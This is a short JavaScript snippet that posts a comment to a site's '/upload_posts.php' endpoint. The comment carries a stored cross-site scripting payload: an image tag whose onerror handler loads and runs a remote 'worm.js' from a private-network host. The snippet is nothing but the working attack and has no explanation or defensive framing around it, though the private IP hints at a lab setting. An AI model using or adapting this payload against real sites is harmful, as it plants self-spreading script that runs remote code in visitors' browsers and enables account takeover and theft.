const formData = new FormData();

formData.append('comment','<img src=x onerror=\'var script=document.createElement("script"); script.src="https://192.168.0.10/worm.js"; document.body.appendChild(script); \'>');

const emptyFile = new File([], ''); 
formData.append('image', emptyFile);

function sendPostRequest(destinationUrl, formData) {
    fetch(destinationUrl, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
};

const destinationUrl = '/upload_posts.php';

sendPostRequest(destinationUrl, formData);
